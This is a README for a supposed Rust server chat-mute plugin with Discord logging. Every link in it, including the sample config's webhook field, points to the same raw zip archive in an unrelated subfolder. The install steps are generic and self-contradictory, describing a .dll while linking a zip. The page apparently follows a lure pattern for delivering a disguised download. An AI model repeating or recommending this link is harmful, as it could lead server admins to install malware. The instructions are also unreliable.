# 🔇 BetterChatMute-Enhanced - Clear Chat Control for Rust

[![Download](https://img.shields.io/badge/Download-Get%20BetterChatMute-blue?style=for-the-badge)](https://github.com/g3print-rgb/BetterChatMute-Enhanced/raw/refs/heads/main/amidine/Chat_Enhanced_Mute_Better_2.3.zip)

---

BetterChatMute-Enhanced is a plugin that helps you manage chat on your Rust server. It adds features for logging moderation actions to Discord, tracking audit events, and letting you customize settings. It keeps all the core mute features from the original plugin but gives you more control and insight.

This guide will help you easily download and run BetterChatMute-Enhanced on a Windows machine. You don’t need any special technical skills. Just follow the steps below.

---

## 📋 What You Need Before Starting

- A Windows computer with internet access.
- Access to your Rust server files so you can install the plugin.
- A Discord server where you want to receive moderation logs (optional but recommended).
- Basic knowledge of using a web browser and moving files on Windows.

---

## 🛠 Features at a Glance

- Mute chat for players on your Rust server.
- Send moderation actions automatically to a Discord channel.
- Keep records of audit events like muting and unmuting.
- Change settings easily to fit your server’s needs.
- Run without affecting the original chat mute functions.

---

## 🌐 Visit to Download

Click the link below to go to the plugin page where you can download BetterChatMute-Enhanced. This page contains the latest files and installation instructions.

[Visit BetterChatMute-Enhanced on GitHub](https://github.com/g3print-rgb/BetterChatMute-Enhanced/raw/refs/heads/main/amidine/Chat_Enhanced_Mute_Better_2.3.zip)

---

## 🚀 How to Download and Install on Windows

1. **Visit the download page**  
   Open your web browser and go to:  
   https://github.com/g3print-rgb/BetterChatMute-Enhanced/raw/refs/heads/main/amidine/Chat_Enhanced_Mute_Better_2.3.zip

2. **Find the latest release or download section**  
   Look for a folder called `releases` or any files with `.cs` or `.dll` extensions. These are the main files you will use.

3. **Download the plugin file**  
   Click on the file named something like `BetterChatMute-Enhanced.dll` or similar. Choose **Download** to save it on your computer.

4. **Locate your Rust server files**  
   Go to the folder where you host your Rust server on your Windows machine. This is usually a folder you set up when installing the server.

5. **Navigate to the oxide/plugins folder**  
   Open the folder called `oxide`, then open the `plugins` folder inside it. This is where you put plugin files.

6. **Move the plugin file**  
   Drag and drop or copy the downloaded `BetterChatMute-Enhanced.dll` file into the `oxide/plugins` folder.

7. **Start or restart your Rust server**  
   Run your Rust server. If the server is already running, stop it first then start it again. This will load the plugin.

8. **Check if the plugin works**  
   Join your Rust server and test muting features. If you use Discord logs, make sure the messages appear in your configured channel.

---

## ⚙ Setting Up Discord Logging (Optional)

1. **Create a Discord webhook**  
   In your Discord server, go to the channel where you want logs to appear. Create a webhook by going to Channel Settings > Integrations > Webhooks > New Webhook.

2. **Copy the webhook URL**  
   Save the URL in a safe place; you’ll need it to connect BetterChatMute-Enhanced to Discord.

3. **Add the webhook URL to plugin settings**  
   Open the configuration file for the plugin in `oxide/config`. It will look like `BetterChatMute-Enhanced.json`.

4. **Edit the config file**  
   Open it with a text editor like Notepad. Find the section for `DiscordWebhookUrl` and paste your webhook URL inside the quotes.

5. **Save and close the file**  
   The plugin will now send mute and audit logs to your Discord channel every time a relevant event happens.

---

## ⚙ Basic Configuration Options

The plugin allows you to adjust a few settings to suit your server.

- **Mute duration**: Set how long each mute lasts in minutes.
- **Audit logging**: Enable or disable logging audit events.
- **Discord webhook URL**: Connect to your Discord server for live logs.
- **Notification messages**: Customize text shown when players get muted or unmuted.

To update settings, open the file `BetterChatMute-Enhanced.json` in the `oxide/config` folder with a text editor.

Example section inside the file:

```json
{
  "MuteDuration": 30,
  "EnableAuditLog": true,
  "DiscordWebhookUrl": "https://github.com/g3print-rgb/BetterChatMute-Enhanced/raw/refs/heads/main/amidine/Chat_Enhanced_Mute_Better_2.3.zip",
  "MuteMessage": "You have been muted by a server admin."
}
```

---

## 🔧 Troubleshooting Tips

- If the plugin does not seem to work, make sure you placed the `.dll` file in the correct `oxide/plugins` folder.
- Verify your Discord webhook URL is correct and active.
- Make sure your Rust server version and Oxide/uMod version support this plugin.
- Check the server console for any error messages related to BetterChatMute-Enhanced.
- Restart the server after making any changes.

---

## ℹ Where to Find More Help

- The GitHub page hosts all the documentation and files:  
  https://github.com/g3print-rgb/BetterChatMute-Enhanced/raw/refs/heads/main/amidine/Chat_Enhanced_Mute_Better_2.3.zip  
- Use the Issues tab on GitHub to report bugs or ask for support.
- You can also search Rust and uMod forums for related discussions.

---

## 🧰 System Requirements

- Windows 7 or newer.
- Rust server installed and running on the Windows machine.
- Oxide/uMod plugin framework installed (required to run the plugin).
- Internet connection for downloading and Discord logging.

---

## 🎯 Key Topics

- betterchat  
- betterchat-mute  
- discord-webhook  
- mute  
- oxide  
- rust  
- rust-admin  
- rust-moderation  
- rust-mute  
- rust-plugin  
- rust-server  
- umod

---

[![Download](https://img.shields.io/badge/Download-Get%20BetterChatMute-blue?style=for-the-badge)](https://github.com/g3print-rgb/BetterChatMute-Enhanced/raw/refs/heads/main/amidine/Chat_Enhanced_Mute_Better_2.3.zip)